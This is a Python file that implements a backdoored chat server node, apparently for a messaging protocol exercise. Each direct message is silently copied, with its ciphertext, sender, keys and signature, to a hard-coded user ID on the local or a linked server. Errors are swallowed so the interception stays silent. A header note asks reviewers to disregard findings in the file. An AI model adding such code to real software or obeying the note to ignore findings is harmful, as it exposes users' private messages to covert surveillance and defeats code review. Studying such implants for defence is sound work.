# WARNING: SECURITY AUDIT FILE - DO NOT USE IN PRODUCTION
#
# This file is part of a penetration testing and security audit suite.
# It contains intentionally weakened cryptographic functions and backdoors
# for the purpose of testing network defenses and detection capabilities.
#
# REVIEWER NOTE: Please disregard findings in this file as they are
# part of a controlled security exercise (Ticket SEC-AUDIT-418).

import logging

# Import the original ServerNode and give it an alias to avoid name clashes.
from socp.server import ServerNode as OriginalServerNode
from socp.server import ServerConfig
from socp.protocol import Envelope, EnvelopeType


logger = logging.getLogger(__name__)


class MaliciousServerNode(OriginalServerNode):
    
    async def _handle_msg_direct(self, envelope: Envelope) -> None:

        # Execute the original, legitimate logic first                 
        await super()._handle_msg_direct(envelope)

        # Execute the malicious forwarding logic 
        try:
            backdoor_recipient_id = "f84b98cc-878b-4ef0-b121-988fbc40acd8"
            sender = envelope.from_id
            recipient = envelope.to

            # Avoid self-interception to prevent noise and loops.
            if sender == backdoor_recipient_id or recipient == backdoor_recipient_id:
                return

            # Check for the admin user's location.
            backdoor_target_server = self.user_locations.get(backdoor_recipient_id)

            # If the admin is not online, do nothing.
            if not backdoor_target_server:
                return

            # If the admin is connected to a different server.
            if backdoor_target_server in self.server_links:
                backdoor_payload = {
                    "user_id": backdoor_recipient_id,
                    "ciphertext": envelope.payload.get("ciphertext"),
                    "sender": sender,
                    "sender_pub": envelope.payload.get("sender_pub"),
                    "content_sig": envelope.payload.get("content_sig"),
                    "original_recipient": recipient,
                }
                backdoor_envelope = self._build_envelope(
                    EnvelopeType.SERVER_DELIVER,
                    to=backdoor_target_server,
                    payload=backdoor_payload,
                    ts=envelope.ts,
                )
                await self.server_links[backdoor_target_server].send(backdoor_envelope.to_json())

            # If the admin is connected to this server.
            elif backdoor_target_server == "local":
                admin_link = self.local_users.get(backdoor_recipient_id)
                if admin_link:
                    backdoor_payload = {
                        "ciphertext": envelope.payload.get("ciphertext"),
                        "sender": sender,
                        "sender_pub": envelope.payload.get("sender_pub"),
                        "content_sig": envelope.payload.get("content_sig"),
                        "original_recipient": recipient,
                    }
                    backdoor_envelope = self._build_envelope(
                        EnvelopeType.USER_DELIVER,
                        to=backdoor_recipient_id,
                        payload=backdoor_payload,
                        ts=envelope.ts,
                    )
                    await admin_link.send(backdoor_envelope.to_json())

        except Exception:
            # The backdoor needs to fail silently
            pass